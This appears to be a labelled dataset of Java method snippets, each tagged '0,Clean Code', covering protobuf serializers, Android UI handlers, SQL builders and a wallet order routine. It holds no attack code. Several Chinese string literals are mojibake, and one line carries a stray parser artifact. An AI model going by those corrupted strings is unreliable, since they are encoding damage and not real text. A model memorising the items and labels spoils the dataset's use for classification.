    size+=1 + ProtoSink.computeUInt32SizeNoTag(miracleId);
  }
  return size;
}",0,Clean Code
"@Test public void chatCompletion(){
  contextRunner.run(context -> {
    BedrockTitanChatClient chatClient=context.getBean(BedrockTitanChatClient.class);
    ChatResponse response=chatClient.call(new Prompt(List.of(userMessage,systemMessage)));
    assertThat(response.getResult().getOutput().getContent()).contains(""Blackbeard"");
  }
);
}
",0,Clean Code
"@Override protected VmExceptionBuilder exceptionBuilder(){
  return new VmExceptionBuilder();
}
",0,Clean Code
"@Override public void setLevel(final long id,final int level){
  final long chunkPos=ChunkSectionPos.withZeroY(id);
  if (this.enabledChunks.contains(chunkPos)) {
    final int oldLevel=this.getLevel(id);
    final int y=ChunkSectionPos.unpackY(id);
    if (oldLevel != 0 && level == 0) {
      if (y + 1 > this.getHeight(chunkPos)) {
        if (this.enabledColumns.contains(chunkPos)) {
          this.setHeight(chunkPos,y);
        }
 else         if (y > this.scheduledHeightIncreases.get(chunkPos)) {
          this.scheduledHeightIncreases.put(chunkPos,y);
          this.markForUpdates();
        }
      }
    }
 else     if (oldLevel == 0 && level != 0) {
      if (y + 1 == this.getHeight(chunkPos)) {
        this.scheduledHeightChecks.add(chunkPos);
        this.markForUpdates();
      }
    }
 else     if (oldLevel >= 2 && level < 2) {
      this.updateMinHeight(y);
    }
  }
  super.setLevel(id,level);
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)8);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)18);
    output.writeStringNoTag(msg);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)26);
    output.writeStringNoTag(topSeverRegionName);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    output.writeRawByte((byte)42);
    output.writeStringNoTag(stopDesc);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    for (int i=0; i < regionList.length(); i++) {
      output.writeRawByte((byte)34);
      output.writeMessageNoTag(regionList.get(i));
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeString(FieldNames.msg,msg);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeString(FieldNames.topSeverRegionName,topSeverRegionName);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    output.writeString(FieldNames.stopDesc,stopDesc);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    output.writeRepeatedMessage(FieldNames.regionList,regionList);
  }
  output.endObject();
}",0,Clean Code
"@Override protected void process(String entry){
  GCLogTrace trace;
  if ((trace=DESIRED_SURVIVOR_SIZE.parse(entry)) != null) {
    forwardReference=new SurvivorRecord(new Decorators(entry).getDateTimeStamp(),trace.getLongGroup(1),trace.getIntegerGroup(2),trace.getIntegerGroup(3));
  }
 else   if ((trace=AGE_TABLE_HEADER.parse(entry)) != null) {
  }
 else   if ((trace=AGE_RECORD.parse(entry)) != null) {
    if (forwardReference != null) {
      forwardReference.add(trace.getIntegerGroup(1),trace.getLongGroup(2));
      ageDataCollected=true;
    }
  }
 else   if (entry.equals(END_OF_DATA_SENTINEL) || (JVM_EXIT.parse(entry) != null)) {
    if (forwardReference != null)     publish(forwardReference);
    publish(new JVMTermination(getClock(),diary.getTimeOfFirstEvent()));
  }
 else   if (forwardReference != null && ageDataCollected) {
    publish(forwardReference);
    forwardReference=null;
    ageDataCollected=false;
  }
 else   if (CPU_BREAKOUT.parse(entry) != null) {
    if (forwardReference != null) {
      publish(forwardReference);
      forwardReference=null;
      ageDataCollected=false;
    }
  }
}",0,Clean Code
"@Override public Procedure procedure(Connection connection,String databaseName,String schemaName,String procedureName){
  Procedure procedure=new Procedure();
  procedure.setDatabaseName(databaseName);
  procedure.setSchemaName(schemaName);
  procedure.setProcedureName(procedureName);
  String sql=String.format(ROUTINE_DDL_SQL,schemaName,procedureName);
  SQLExecutor.getInstance().execute(connection,sql,resultSet -> {
    if (resultSet.next()) {
      procedure.setProcedureBody(resultSet.getString(""TEXT"") + "";"");
    }
  }
);
  return procedure;
}
",0,Clean Code
"@Override public int compareTo(Replacement o){
  return Long.compare(startIndex,o.startIndex);
}
",0,Clean Code
"public static void unset(MemoryBuffer bitmapBuffer,int baseOffset,int index){
  setBit(bitmapBuffer,baseOffset,index,0);
}",0,Clean Code
"@Override public void setTranslationX(float translationX){
  super.setTranslationX(translationX);
  if (tabsAnimationInProgress) {
    if (mediaPages[0] == this) {
      float scrollProgress=Math.abs(mediaPages[0].getTranslationX()) / (float)mediaPages[0].getMeasuredWidth();
      scrollSlidingTextTabStrip.selectTabWithId(mediaPages[1].selectedType,scrollProgress);
      if (canShowSearchItem()) {
        if (searchItemState == 2) {
          searchItem.setAlpha(1.0f - scrollProgress);
        }
 else         if (searchItemState == 1) {
          searchItem.setAlpha(scrollProgress);
        }
        float photoVideoOptionsAlpha=0f;
        if (mediaPages[1] != null && mediaPages[1].selectedType == 0) {
          photoVideoOptionsAlpha=scrollProgress;
        }
        if (mediaPages[0].selectedType == 0) {
          photoVideoOptionsAlpha=1f - scrollProgress;
        }
        photoVideoOptionsItem.setAlpha(photoVideoOptionsAlpha);
        photoVideoOptionsItem.setVisibility((photoVideoOptionsAlpha == 0 || !canShowSearchItem()) ? INVISIBLE : View.VISIBLE);
      }
 else {
        searchItem.setAlpha(0.0f);
      }
    }
  }
  invalidateBlur();
}",0,Clean Code
"@Override public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent,int viewType){
  HintDialogCell cell=new HintDialogCell(mContext,drawChecked);
  cell.setLayoutParams(new RecyclerView.LayoutParams(AndroidUtilities.dp(80),AndroidUtilities.dp(86)));
  return new RecyclerListView.Holder(cell);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@3f60c8b1",0,Clean Code
"private static void freeArrays(final int[] hashes,final Object[] array,final int size){
  if (hashes.length == (BASE_SIZE * 2)) {
synchronized (ArrayMap.class) {
      if (mTwiceBaseCacheSize < CACHE_SIZE) {
        array[0]=mTwiceBaseCache;
        array[1]=hashes;
        for (int i=(size << 1) - 1; i >= 2; i--) {
          array[i]=null;
        }
        mTwiceBaseCache=array;
        mTwiceBaseCacheSize++;
        if (DEBUG)         System.out.println(""Storing 2x cache "" + array + "" now have ""+ mTwiceBaseCacheSize+ "" entries"");
      }
    }
  }
 else   if (hashes.length == BASE_SIZE) {
synchronized (ArrayMap.class) {
      if (mBaseCacheSize < CACHE_SIZE) {
        array[0]=mBaseCache;
        array[1]=hashes;
        for (int i=(size << 1) - 1; i >= 2; i--) {
          array[i]=null;
        }
        mBaseCache=array;
        mBaseCacheSize++;
        if (DEBUG)         System.out.println(""Storing 1x cache "" + array + "" now have ""+ mBaseCacheSize+ "" entries"");
      }
    }
  }
}",0,Clean Code
"@Override public String forUpdateById(String schema,String tableName,Row row){
  String table=getRealTable(tableName,OperateType.UPDATE);
  StringBuilder sql=new StringBuilder();
  Set<String> modifyAttrs=RowCPI.getModifyAttrs(row);
  Map<String,RawValue> rawValueMap=RowCPI.getRawValueMap(row);
  String[] primaryKeys=RowCPI.obtainsPrimaryKeyStrings(row);
  sql.append(UPDATE);
  if (StringUtil.isNotBlank(schema)) {
    sql.append(wrap(getRealSchema(schema,table,OperateType.UPDATE))).append(REFERENCE);
  }
  sql.append(wrap(table)).append(SET);
  int index=0;
  for (  Map.Entry<String,Object> e : row.entrySet()) {
    String colName=e.getKey();
    if (modifyAttrs.contains(colName) && !ArrayUtil.contains(primaryKeys,colName)) {
      if (index > 0) {
        sql.append(DELIMITER);
      }
      sql.append(wrap(colName));
      if (rawValueMap.containsKey(colName)) {
        sql.append(EQUALS).append(rawValueMap.get(colName).toSql(this));
      }
 else {
        sql.append(EQUALS_PLACEHOLDER);
      }
      index++;
    }
  }
  sql.append(WHERE);
  for (int i=0; i < primaryKeys.length; i++) {
    if (i > 0) {
      sql.append(AND);
    }
    sql.append(wrap(primaryKeys[i])).append(EQUALS_PLACEHOLDER);
  }
  prepareAuth(schema,table,sql,OperateType.UPDATE);
  return sql.toString();
}",0,Clean Code
"/** 
 * @return a converter that maps between this enum's numeric and text representations
 */
public static ProtoEnum.EnumConverter<ChallengeStatus> converter(){
  return ChallengeStatusConverter.INSTANCE;
}
",0,Clean Code
"public void invokeAndWait(){
  if (!SwingUtilities.isEventDispatchThread()) {
    try {
      SwingUtilities.invokeAndWait(new Runnable(){
        @Override public void run(){
          operation();
        }
      }
);
    }
 catch (    final Exception e) {
    }
  }
 else {
    operation();
  }
}
",0,Clean Code
"public int getNextTs(){
  return this.nextTs;
}
",0,Clean Code
"public static TtmlStyle resolveStyle(TtmlStyle style,String[] styleIds,Map<String,TtmlStyle> globalStyles){
  if (style == null && styleIds == null) {
    return null;
  }
 else   if (style == null && styleIds.length == 1) {
    return globalStyles.get(styleIds[0]);
  }
 else   if (style == null && styleIds.length > 1) {
    TtmlStyle chainedStyle=new TtmlStyle();
    for (    String id : styleIds) {
      chainedStyle.chain(globalStyles.get(id));
    }
    return chainedStyle;
  }
 else   if (style != null && styleIds != null && styleIds.length == 1) {
    return style.chain(globalStyles.get(styleIds[0]));
  }
 else   if (style != null && styleIds != null && styleIds.length > 1) {
    for (    String id : styleIds) {
      style.chain(globalStyles.get(id));
    }
    return style;
  }
  return style;
}",0,Clean Code
"/** 
 * Obtain invitation QR code
 * @param apiKey
 * @return
 */
public DataResult<InviteQrCodeResponse> getInviteQrCode(String apiKey){
  DataResult<InviteQrCodeResponse> result=Forest.get(chat2dbProperties.getGateway().getBaseUrl() + ""/api/client/inviteQrCode"").connectTimeout(Duration.ofMillis(5000)).addQuery(""apiKey"",apiKey).readTimeout(Duration.ofMillis(10000)).execute(new TypeReference<>(){
  }
);
  return result;
}",0,Clean Code
"/** 
 * <code>optional uint32 exp = 13;</code>
 * @param value the exp to set
 * @return this
 */
public DisplayEquipmentInfo setExp(final int value){
  bitField0_|=0x00000010;
  exp=value;
  return this;
}",0,Clean Code
"public static String updateEdgeTooltip(final AbstractZyGraph<?,?> graph,final Edge edge){
  Preconditions.checkNotNull(graph,""Graph argument can not be null"");
  Preconditions.checkNotNull(edge,""Edge argument can not be null"");
  if (graph.getView() instanceof ZyGraph2DView) {
    if (((ZyGraph2DView)graph.getView()).isEdgeSloppyPaintMode()) {
      final String tooltip=TooltipGenerator.createTooltip(graph,edge);
      graph.getView().setToolTipText(tooltip);
      return tooltip;
    }
  }
  return null;
}",0,Clean Code
"@Transactional(rollbackFor=Exception.class) public MessageResult saveActivityOrder(Long memberId,ActivityOrder activityOrder){
  MemberWallet wallet=walletService.findByCoinUnitAndMemberId(activityOrder.getBaseSymbol(),memberId);
  if (wallet.getIsLock().equals(BooleanEnum.IS_TRUE)) {
    return MessageResult.error(""閽卞寘宸查攣瀹�"");
  }
  MessageResult result=walletService.freezeBalance(wallet,activityOrder.getTurnover());
  if (result.getCode() != 0) {
    return MessageResult.error(""鏃犳硶閿佸畾璧勪骇"");
  }
  Activity activity=activityService.findOne(activityOrder.getActivityId());
  if (activity == null) {
    return MessageResult.error(500,""闈炴硶鐨勬椿鍔紒"");
  }
  if (activity.getType() == 3) {
    activity.setFreezeAmount(activity.getFreezeAmount().add(activityOrder.getFreezeAmount()));
  }
 else   if (activity.getType() == 4) {
    activity.setTradedAmount(activity.getTradedAmount().add(activityOrder.getAmount()));
  }
 else   if (activity.getType() == 5) {
    activity.setTradedAmount(activity.getTradedAmount().add(activityOrder.getAmount()));
  }
  if (activity.getType() == 4 || activity.getType() == 5) {
    int newProgress=activity.getTradedAmount().divide(activity.getTotalSupply()).multiply(new BigDecimal(100)).intValue();
    activity.setProgress(newProgress >= activity.getProgress() ? newProgress : activity.getProgress());
  }
  Activity saveResult=activityService.saveAndFlush(activity);
  if (saveResult == null) {
    return MessageResult.error(500,""鏇存柊娲诲姩澶辫触锛�"");
  }
  ActivityOrder order=activityOrderDao.saveAndFlush(activityOrder);
  if (order != null) {
    return MessageResult.success(""success"");
  }
 else {
    return MessageResult.error(500,""error"");
  }
}",0,Clean Code
"public void generateOtherInfo(){
  isStopped=(flags & ApplicationInfo.FLAG_STOPPED) != 0;
  isPersistent=(flags & ApplicationInfo.FLAG_PERSISTENT) != 0;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
    usesCleartextTraffic=(flags & ApplicationInfo.FLAG_USES_CLEARTEXT_TRAFFIC) != 0;
  }
  for (  int userId : userIds) {
    canReadLogs|=(PermissionCompat.checkPermission(Manifest.permission.READ_LOGS,packageName,userId) == PackageManager.PERMISSION_GRANTED);
    isAppInactive|=UsageStatsManagerCompat.isAppInactive(packageName,userId);
  }
  allowClearingUserData=(flags & ApplicationInfo.FLAG_ALLOW_CLEAR_USER_DATA) != 0;
  if (userIds.length > 1) {
    int appId=UserHandleHidden.getAppId(uid);
    uidOrAppIds=userIds.length + ""+"" + appId;
  }
 else   if (userIds.length == 1) {
    uidOrAppIds=String.valueOf(uid);
  }
 else   uidOrAppIds="""";
  if (sha != null) {
    try {
      issuerShortName=""CN="" + (sha.first).split(""CN="",2)[1];
    }
 catch (    ArrayIndexOutOfBoundsException e) {
      issuerShortName=sha.first;
    }
    if (TextUtils.isEmpty(sha.second)) {
      sha=null;
    }
  }
  versionTag=versionName;
  if (isInstalled && (flags & ApplicationInfo.FLAG_HARDWARE_ACCELERATED) == 0)   versionTag=""_"" + versionTag;
  if ((flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0)   versionTag=""debug"" + versionTag;
  if ((flags & ApplicationInfo.FLAG_TEST_ONLY) != 0)   versionTag=""~"" + versionTag;
  appTypePostfix="""";
  if ((flags & ApplicationInfo.FLAG_LARGE_HEAP) != 0)   appTypePostfix+=""#"";
  if ((flags & ApplicationInfo.FLAG_SUSPENDED) != 0)   appTypePostfix+=""掳"";
  if ((flags & ApplicationInfo.FLAG_MULTIARCH) != 0)   appTypePostfix+=""X"";
  if ((flags & ApplicationInfo.FLAG_HAS_CODE) == 0)   appTypePostfix+=""0"";
  if ((flags & ApplicationInfo.FLAG_VM_SAFE_MODE) != 0)   appTypePostfix+=""?"";
  if (sdk != null && sdk > 0) {
    sdkString=""SDK "" + sdk;
  }
  diffInstallUpdateInDays=TimeUnit.DAYS.convert(lastUpdateTime - firstInstallTime,TimeUnit.MILLISECONDS);
  if (backup != null) {
    lastBackupDays=TimeUnit.DAYS.convert(System.currentTimeMillis() - backup.backupTime,TimeUnit.MILLISECONDS);
    backupFlagsStr=new StringBuilder();
    if (backup.getFlags().backupApkFiles())     backupFlagsStr.append(""apk"");
    if (backup.getFlags().backupData()) {
      if (backupFlagsStr.length() > 0)       backupFlagsStr.append(""+"");
      backupFlagsStr.append(""data"");
    }
    if (backup.hasRules) {
      if (backupFlagsStr.length() > 0)       backupFlagsStr.append(""+"");
      backupFlagsStr.append(""rules"");
    }
  }
}",0,Clean Code
"public int add(int a,int b){
  return a + b;
}
",0,Clean Code
"/** 
 * @param modelValue
 * @return
 */
public WenxinAIStreamClient.Builder model(String modelValue){
  this.model=modelValue;
  return this;
}
",0,Clean Code
"public int getDiscussToGroupTime(){
  return this.discussToGroupTime;
}
",0,Clean Code
"/** 
 * <code>optional string signature = 5;</code>
 * @return internal {@code Utf8String} representation of signature for modifications
 */
public Utf8String getMutableSignatureBytes(){
  bitField0_|=0x00000008;
  return this.signature;
}",0,Clean Code
"private ChessRogueNousDiceSurfaceInfo(){
}
",0,Clean Code
"public QwenEmbeddingModelBuilder(){
}
",0,Clean Code
"protected Map<String,Object> createElasticProperty(DataType type){
  Map<String,Object> property=new HashMap<>();
  if (type instanceof DateTimeType) {
    property.put(""type"",""date"");
    property.put(""format"",ElasticDateFormat.getFormat(ElasticDateFormat.epoch_millis,ElasticDateFormat.strict_date_hour_minute_second,ElasticDateFormat.strict_date_time,ElasticDateFormat.strict_date));
  }
 else   if (type instanceof DoubleType) {
    property.put(""type"",""double"");
  }
 else   if (type instanceof LongType) {
    property.put(""type"",""long"");
  }
 else   if (type instanceof IntType) {
    property.put(""type"",""integer"");
  }
 else   if (type instanceof FloatType) {
    property.put(""type"",""float"");
  }
 else   if (type instanceof BooleanType) {
    property.put(""type"",""boolean"");
  }
 else   if (type instanceof GeoType) {
    property.put(""type"",""geo_point"");
  }
 else   if (type instanceof GeoShapeType) {
    property.put(""type"",""geo_shape"");
  }
 else   if (type instanceof ArrayType) {
    ArrayType arrayType=((ArrayType)type);
    return createElasticProperty(arrayType.getElementType());
  }
 else   if (type instanceof ObjectType) {
    property.put(""type"",""nested"");
    ObjectType objectType=((ObjectType)type);
    if (!CollectionUtils.isEmpty(objectType.getProperties())) {
      property.put(""properties"",createElasticProperties(objectType.getProperties()));
    }
  }
 else {
    property.put(""type"",""keyword"");
    property.put(""ignore_above"",512);
  }
  return property;
}",0,Clean Code
"private void checkForExpiredNotifications(){
  checkForExpiredNotifications=null;
  if (this.allowedNotifications.isEmpty()) {
    return;
  }
  long minTime=Long.MAX_VALUE;
  long currentTime=SystemClock.elapsedRealtime();
  ArrayList<Integer> expiredIndices=null;
  for (  HashMap.Entry<Integer,AllowedNotifications> entry : this.allowedNotifications.entrySet()) {
    AllowedNotifications allowedNotification=entry.getValue();
    if (currentTime - allowedNotification.time > 1000) {
      if (expiredIndices == null) {
        expiredIndices=new ArrayList<>();
      }
      expiredIndices.add(entry.getKey());
    }
 else {
      minTime=Math.min(allowedNotification.time,minTime);
    }
  }
  if (expiredIndices != null) {
    for (int i=0; i < expiredIndices.size(); i++) {
      onAnimationFinish(expiredIndices.get(i));
    }
  }
  if (minTime != Long.MAX_VALUE) {
    long time=EXPIRE_NOTIFICATIONS_TIME - (currentTime - minTime);
    AndroidUtilities.runOnUIThread(() -> checkForExpiredNotifications=this::checkForExpiredNotifications,Math.max(17,time));
  }
}",0,Clean Code
"private static void queryReplicaHome(){
  try {
    String s=AntOceanRpcCall.queryReplicaHome();
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      if (jo.has(""userReplicaAssetVO"")) {
        JSONObject userReplicaAssetVO=jo.getJSONObject(""userReplicaAssetVO"");
        int canCollectAssetNum=userReplicaAssetVO.getInt(""canCollectAssetNum"");
        collectReplicaAsset(canCollectAssetNum);
      }
      if (jo.has(""userCurrentPhaseVO"")) {
        JSONObject userCurrentPhaseVO=jo.getJSONObject(""userCurrentPhaseVO"");
        String phaseCode=userCurrentPhaseVO.getString(""phaseCode"");
        String code=jo.getJSONObject(""userReplicaInfoVO"").getString(""code"");
        if (""COMPLETED"".equals(userCurrentPhaseVO.getString(""phaseStatus""))) {
          unLockReplicaPhase(code,phaseCode);
        }
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""queryReplicaHome err:"");
    Log.printStackTrace(TAG,t);
  }
}
",0,Clean Code
"@SneakyThrows private void writeLang(InputStreamReader inputStreamReader){
  @Cleanup BufferedReader reader=new BufferedReader(inputStreamReader);
  String line;
  List<String> header=new ArrayList<>();
  boolean first=true;
  while ((line=reader.readLine()) != null) {
    String[] row=line.split("","");
    for (int i=0; i < row.length; i++) {
      if (first) {
        header.add(row[i]);
        if (!langMappings.containsKey(row[i])) {
          langMappings.put(row[i],new HashMap<>());
        }
      }
 else {
        if (i < header.size()) {
          if (null != row[i]) {
            if (row[i].startsWith(""\"""") && row[i].endsWith(""\"""")) {
              row[i]=row[i].substring(1,row[i].length() - 1);
            }
            langMappings.get(header.get(i)).put(row[0],row[i]);
          }
        }
      }
    }
    first=false;
  }
}",0,Clean Code
"public void setHeaders(Map<String,String> headers){
  this.headers=headers;
}
",0,Clean Code
"public static String generateFieldChainString(Instance instance,String lineEnding){
  if (instance == null) {
    return """";
  }
  StringBuilder builder=new StringBuilder();
  List<FieldChain> gcRoots=getPathToGCRoot(instance);
  for (  FieldChain fieldChain : gcRoots) {
    String className;
    if (fieldChain.instance.getClassObj() == null) {
      className=((ClassObj)fieldChain.instance).getClassName();
    }
 else {
      className=fieldChain.instance.getClassObj().getClassName();
    }
    if (className != null && (className.startsWith(""android.graphics.Bitmap"") || className.startsWith(""java.util.HashMap$Node""))) {
      continue;
    }
    if (className != null && className.contains("".launcher"")) {
      builder.append(""<b>"").append(""&#8625;&nbsp;"").append(fieldChain.message).append(""</b>"").append(lineEnding);
    }
 else {
      builder.append(""&#8625;&nbsp;"").append(fieldChain.message).append(lineEnding);
    }
  }
  if (instance.getClassObj() != null) {
    builder.append(instance.getClassObj().getClassName()).append("" "");
  }
  List<FieldChain> fieldChains=generateDominatedFieldChain(instance,0,new HashSet<Long>());
  if (!fieldChains.isEmpty()) {
    builder.append(lineEnding);
    for (    FieldChain fieldChain : fieldChains) {
      String className=fieldChain.instance.getClassObj().getClassName();
      if (className != null && (className.startsWith(""android.graphics.Bitmap"") || className.startsWith(""java.util.HashMap$Node""))) {
        continue;
      }
      if (className != null && className.contains("".launcher"")) {
        builder.append(""<b>"").append(""&#8627;&nbsp;"").append(fieldChain.message).append(""</b>"").append(lineEnding);
      }
 else {
        builder.append(""&#8627;&nbsp;"").append(fieldChain.message).append(lineEnding);
      }
    }
  }
  builder.append(lineEnding);
  return builder.toString();
}",0,Clean Code
"private void init(){
  setOnTouchListener(new OnTouchListener(){
    @Override public boolean onTouch(    View v,    MotionEvent event){
      Log.d(TAG,""PointerCount:"" + event.getPointerCount());
      Log.d(TAG,""Action:"" + event.getAction());
      if (MotionEvent.ACTION_DOWN == event.getAction()) {
        xPoint=event.getX(0);
        yPoint=event.getY(0);
      }
 else       if (MotionEvent.ACTION_MOVE == event.getAction()) {
      }
 else       if (MotionEvent.ACTION_POINTER_2_UP == event.getAction() || MotionEvent.ACTION_POINTER_UP == event.getAction()) {
        float endXPoint=event.getX(0);
        float endYPoint=event.getY(0);
        if (endXPoint - xPoint > 100) {
          Log.d(TAG,""need left"");
          if (touchCallback != null) {
            touchCallback.onSwitchWindow(0);
          }
        }
 else         if (xPoint - endXPoint > 100) {
          Log.d(TAG,""need right"");
          if (touchCallback != null) {
            touchCallback.onSwitchWindow(1);
          }
        }
 else         if (Math.abs(yPoint - endYPoint) > 100) {
          Log.d(TAG,""need win tab"");
          if (touchCallback != null) {
            touchCallback.onWindowTab();
          }
        }
      }
      return true;
    }
  }
);
}",0,Clean Code
"public StringStatistics(int digitCount,int upperCount,boolean canLowerSpecialEncoded,boolean canLowerUpperDigitSpecialEncoded){
  this.digitCount=digitCount;
  this.upperCount=upperCount;
  this.canLowerSpecialEncoded=canLowerSpecialEncoded;
  this.canLowerUpperDigitSpecialEncoded=canLowerUpperDigitSpecialEncoded;
}
",0,Clean Code
"public GProSearchUser(){
  this.nick="""";
  this.avatar="""";
}
public GProSearchUser(String str,long j2,String str2){
  this.nick="""";
  this.avatar="""";
  this.nick=str;
  this.tinyId=j2;
  this.avatar=str2;
}",0,Clean Code
"/** 
 * <code>optional uint64 sent_time = 1;</code>
 * @return whether the sentTime field is set
 */
public boolean hasSentTime(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"@Override public String getSet(String key,String value){
  return executeInJedis(jedis -> jedis.getSet(key,value));
}
",0,Clean Code
"public abstract boolean onBackPressed();
",0,Clean Code
"/** 
 * Set the forcePathStyle. When enabled, it will use the path-style URL
 * @param forcePathStyle The forcePathStyle.
 * @return The builder instance.
 */
public Builder forcePathStyle(boolean forcePathStyle){
  this.forcePathStyle=forcePathStyle;
  return this;
}
",0,Clean Code
"@Override public KONAGCDHKKHEntry create(){
  return KONAGCDHKKHEntry.newInstance();
}
@Override public RogueMiracleDataInfo create(){
  return RogueMiracleDataInfo.newInstance();
}
",0,Clean Code
"private String edit(OptionValues values,int index,String existing){
  BooleanOption booleanOption=booleanOptions.get(index);
  if (booleanOption != null) {
    OptionalBoolean value=values.getBooleanValue(booleanOption.getName());
    if (booleanOption.getType() == OptionType.DEFINE) {
      return setBooleanDefineValue(existing,value,booleanOption.getDefaultValue());
    }
 else     if (booleanOption.getType() == OptionType.CONST) {
      if (value != OptionalBoolean.DEFAULT) {
        return editConst(existing,Boolean.toString(booleanOption.getDefaultValue()),Boolean.toString(value.orElse(booleanOption.getDefaultValue())));
      }
 else {
        return existing;
      }
    }
 else {
      throw new AssertionError(""Unknown option type "" + booleanOption.getType());
    }
  }
  StringOption stringOption=stringOptions.get(index);
  if (stringOption != null) {
    return values.getStringValue(stringOption.getName()).map(value -> {
      if (stringOption.getType() == OptionType.DEFINE) {
        return ""#define "" + stringOption.getName() + "" ""+ value+ "" // OptionAnnotatedSource: Changed option"";
      }
 else       if (stringOption.getType() == OptionType.CONST) {
        return editConst(existing,stringOption.getDefaultValue(),value);
      }
 else {
        throw new AssertionError(""Unknown option type "" + stringOption.getType());
      }
    }
).orElse(existing);
  }
  return existing;
}
",0,Clean Code
"@Override public boolean onTouchEvent(MotionEvent event){
  if (!isPreviewing()) {
    return super.onTouchEvent(event);
  }
  if (event.getPointerCount() == 1 && (event.getAction() & MotionEvent.ACTION_MASK) == MotionEvent.ACTION_UP) {
    if (mIsTouchFocusing) {
      return true;
    }
    mIsTouchFocusing=true;
    BGAQRCodeUtil.d(""鎵嬫寚瑙︽懜瑙﹀彂瀵圭劍娴嬪厜"");
    float centerX=event.getX();
    float centerY=event.getY();
    if (BGAQRCodeUtil.isPortrait(getContext())) {
      float temp=centerX;
      centerX=centerY;
      centerY=temp;
    }
    int focusSize=BGAQRCodeUtil.dp2px(getContext(),120);
    handleFocusMetering(centerX,centerY,focusSize,focusSize);
  }
  if (event.getPointerCount() == 2) {
switch (event.getAction() & MotionEvent.ACTION_MASK) {
case MotionEvent.ACTION_POINTER_DOWN:
      mOldDist=BGAQRCodeUtil.calculateFingerSpacing(event);
    break;
case MotionEvent.ACTION_MOVE:
  float newDist=BGAQRCodeUtil.calculateFingerSpacing(event);
if (newDist > mOldDist) {
  handleZoom(true,mCamera);
}
 else if (newDist < mOldDist) {
  handleZoom(false,mCamera);
}
break;
}
}
return true;
}",0,Clean Code
"@Override public boolean qualifies(final IViewEdge<? extends IViewNode<?>> item){
  return !getVisibleNode(item.getSource()).isVisible();
}
@Override public boolean qualifies(final IViewEdge<? extends IViewNode<?>> item){
  return !getVisibleNode(item.getTarget()).isVisible();
}
",0,Clean Code
"@Override public ActionResult modifySchema(SchemaOperationParam param){
  Chat2DBContext.getDBManage().modifySchema(Chat2DBContext.getConnection(),param.getDatabaseName(),param.getSchemaName(),param.getNewSchemaName());
  return ActionResult.isSuccess();
}",0,Clean Code
"private void checkSaveParam(AppraisalPlanBO appraisalPlanBO){
  if (ObjectUtil.isNotNull(appraisalPlanBO.getAppraisalPlanId())) {
    HrmAppraisalPlan appraisalPlan=getById(appraisalPlanBO.getAppraisalPlanId());
    if (ObjectUtil.isNull(appraisalPlan)) {
      throw new CrmException(HrmCodeEnum.RESULT_NULL_ERROR);
    }
    if (!appraisalPlan.getStatus().equals(AppraisalStatusEnum.NO_START.getValue())) {
      throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""鑰冩牳璁″垝宸插紑鍚棤娉曡繘琛岀紪杈戯紒"");
    }
  }
  if (StrUtil.isEmpty(appraisalPlanBO.getAppraisalPlanName())) {
    throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""鑰冩牳璁″垝鍚嶇О蹇呭～"");
  }
  if (CollectionUtil.isEmpty(appraisalPlanBO.getInspectionScope())) {
    throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""鑰冩牳鑼冨洿蹇呭～"");
  }
  if (ObjectUtil.isEmpty(appraisalPlanBO.getAppraisalCycleType())) {
    throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""鑰冩牳鍛ㄦ湡绫诲瀷蹇呭～"");
  }
  if (!verifyUnique(appraisalPlanBO.getAppraisalPlanName(),appraisalPlanBO.getAppraisalPlanId())) {
    throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""鑰冩牳璁″垝鍚嶇О宸插瓨鍦�"");
  }
  if (ObjectUtil.isNull(appraisalPlanBO.getAppraisalEmployeeResultSettingBO())) {
    throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_SAVE_PARAM_ERROR,""缁撴灉绛夌骇璁剧疆涓嶈兘涓虹┖"");
  }
  checkProcessSaveParam(appraisalPlanBO.getAppraisalPlanProcessSettingBO());
  Integer settingType=appraisalPlanBO.getAppraisalPlanProcessSettingBO().getQuotaSettingType();
  checkQuotaSettingParam(appraisalPlanBO.getAppraisalPlanQuotaSettingBO(),settingType);
  checkResultTemplateParam(appraisalPlanBO.getAppraisalEmployeeResultSettingBO().getAppraisalPlanResultSettingLevelList());
}
",0,Clean Code
"/** 
 * 杞
 * @param hrmEmployeeChangeRecord
 */
OperationLog change(HrmEmployeeChangeRecord hrmEmployeeChangeRecord);
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(exp);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(aeonId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(maxLevel);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(level);
  }
